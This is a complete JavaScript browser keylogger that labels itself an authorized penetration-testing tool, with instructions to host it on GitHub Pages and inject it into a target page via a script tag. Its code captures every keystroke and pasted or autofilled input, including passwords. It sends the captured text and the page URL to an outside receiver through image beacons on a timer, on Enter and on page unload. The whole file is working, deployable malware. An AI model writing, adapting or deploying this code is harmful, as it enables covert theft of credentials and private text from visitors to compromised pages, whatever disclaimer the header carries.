/**
 * keylogger.js — Browser-Based Keystroke Logger
 * =============================================
 * Authorized Penetration Testing Tool
 * For authorized security assessments only.
 *
 * Usage:
 *   1. Upload receiver.html to GitHub Pages
 *   2. Update RECEIVER_URL below
 *   3. Inject into target page via:
 *      <script src="https://YOUR_USERNAME.github.io/REPO/keylogger.js"></script>
 */

(function() {
    'use strict';

    // ============================================================
    //  CONFIGURATION — UPDATE THESE BEFORE USE
    // ============================================================
    const RECEIVER_URL = 'https://YOUR_USERNAME.github.io/REPO/receiver.html';
    const FLUSH_INTERVAL_MS = 3000;      // Send batched keys every 3 seconds
    const INCLUDE_INPUT_EVENTS = true;    // Also capture paste/autofill from input fields
    const DEBUG = false;                  // Set true to log to console

    // ============================================================
    //  INTERNAL STATE
    // ============================================================
    let keystrokeBuffer = '';
    let lastFlushTime = Date.now();
    let isActive = true;

    // ============================================================
    //  SPECIAL KEY MAPPING
    // ============================================================
    const SPECIAL_KEYS = {
        'Enter':     '[ENTER]\n',
        'Tab':       '[TAB]',
        'Backspace': '[BACKSPACE]',
        'Shift':     '[SHIFT]',
        'Control':   '[CTRL]',
        'Alt':       '[ALT]',
        'CapsLock':  '[CAPSLOCK]',
        'Escape':    '[ESC]',
        'ArrowUp':   '[UP]',
        'ArrowDown': '[DOWN]',
        'ArrowLeft': '[LEFT]',
        'ArrowRight':'[RIGHT]',
        'Delete':    '[DEL]',
        'Home':      '[HOME]',
        'End':       '[END]',
        'PageUp':    '[PGUP]',
        'PageDown':  '[PGDN]',
        'Meta':      '[WIN]',
        'Insert':    '[INS]',
        'F1':        '[F1]',
        'F2':        '[F2]',
        'F3':        '[F3]',
        'F4':        '[F4]',
        'F5':        '[F5]',
        'F6':        '[F6]',
        'F7':        '[F7]',
        'F8':        '[F8]',
        'F9':        '[F9]',
        'F10':       '[F10]',
        'F11':       '[F11]',
        'F12':       '[F12]',
    };

    // ============================================================
    //  LOGGING
    // ============================================================
    function log(msg) {
        if (DEBUG) console.log('[keylogger]', msg);
    }

    // ============================================================
    //  KEYSTROKE CAPTURE — Global keydown handler
    // ============================================================
    document.addEventListener('keydown', function(e) {
        if (!isActive) return;

        const key = e.key;
        if (!key) return;

        // Ignore modifier-only events (they fire on their own)
        if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
            return;
        }

        // Map special keys
        if (SPECIAL_KEYS[key]) {
            keystrokeBuffer += SPECIAL_KEYS[key];
            log('Special: ' + SPECIAL_KEYS[key].trim());
        }
        // Regular printable character
        else if (key.length === 1) {
            // Respect shift state for uppercase
            keystrokeBuffer += key;
            log('Char: ' + key);
        }
        // Other (e.g., media keys, volume, etc.) — ignore

        // Flush if buffer is getting large or Enter was pressed
        if (keystrokeBuffer.length > 500 || key === 'Enter') {
            flushBuffer();
            lastFlushTime = Date.now();
        }
    });

    // ============================================================
    //  INPUT EVENTS — Catches paste, autofill, IME composition
    // ============================================================
    if (INCLUDE_INPUT_EVENTS) {
        document.addEventListener('input', function(e) {
            if (!isActive) return;
            const target = e.target;
            const tag = target.tagName.toLowerCase();
            if (tag === 'input' || tag === 'textarea') {
                // Capture the last character typed/pasted
                const val = target.value;
                if (val.length > 0) {
                    keystrokeBuffer += val.slice(-1);
                    log('Input: ' + val.slice(-1));
                }
            }
        });
    }

    // ============================================================
    //  FLUSH BUFFER — Send data to receiver
    // ============================================================
    function flushBuffer() {
        if (keystrokeBuffer.length === 0) return;

        const data = keystrokeBuffer;
        keystrokeBuffer = '';

        const url = RECEIVER_URL +
            '?k=' + encodeURIComponent(data) +
            '&u=' + encodeURIComponent(window.location.href) +
            '&t=' + Date.now();

        log('Flushing: ' + data.length + ' chars');

        // Use Image beacon — most reliable CORS-friendly method
        try {
            const img = new Image();
            img.src = url.replace(/&amp;/g, '&');
            // No need to append to DOM — just setting src fires the request
        } catch (err) {
            log('Beacon error: ' + err.message);
        }
    }

    // ============================================================
    //  TIMED FLUSH — Send buffered keys periodically
    // ============================================================
    setInterval(function() {
        if (keystrokeBuffer.length > 0 && (Date.now() - lastFlushTime >= FLUSH_INTERVAL_MS)) {
            flushBuffer();
            lastFlushTime = Date.now();
        }
    }, 1000);

    // ============================================================
    //  PAGE UNLOAD — Flush remaining data before leaving
    // ============================================================
    window.addEventListener('beforeunload', function() {
        flushBuffer();
    });

    // Also flush when user navigates via SPA (pushState)
    let lastUrl = window.location.href;
    const urlObserver = setInterval(function() {
        if (window.location.href !== lastUrl) {
            flushBuffer();
            lastUrl = window.location.href;
        }
    }, 500);

    // ============================================================
    //  CLEANUP FUNCTION — Call to stop the keylogger
    // ============================================================
    window.__stopKeylogger = function() {
        isActive = false;
        clearInterval(urlObserver);
        log('Keylogger stopped');
    };

    log('Loaded. Target URL: ' + window.location.href);

})();
